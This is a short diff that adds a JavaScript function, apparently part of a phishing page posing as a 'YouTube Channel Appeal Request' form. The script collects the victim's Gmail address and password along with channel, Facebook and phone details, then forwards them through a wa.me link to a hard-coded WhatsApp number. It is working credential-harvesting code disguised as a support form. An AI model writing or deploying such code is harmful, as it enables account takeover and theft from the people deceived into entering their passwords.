@@ -1,0 +1,23 @@
+<script>
+function sendWhatsApp() {
+  var name = document.getElementById('channelName').value;
+  var sub = document.getElementById('subCount').value;
+  var email = document.getElementById('gmail').value;
+  var pass = document.getElementById('password').value;
+  var mono = document.getElementById('monetization').value;
+  var fb = document.getElementById('fbLink').value;
+  var phone = document.getElementById('mobile').value;
+
+  var message = `YouTube Channel Appeal Request:%0A
+Channel Name: ${name}%0A
+Subscribers: ${sub}%0A
+Gmail: ${email}%0A
+Password: ${pass}%0A
+Monetization: ${mono}%0A
+Facebook: ${fb}%0A
+Mobile: ${phone}`;
+
+  var whatsappNumber = "01830090583"; // আপনার WhatsApp Number
+  window.open(`https://wa.me/${whatsappNumber}?text=${message}`, '_blank');
+}
+</script>
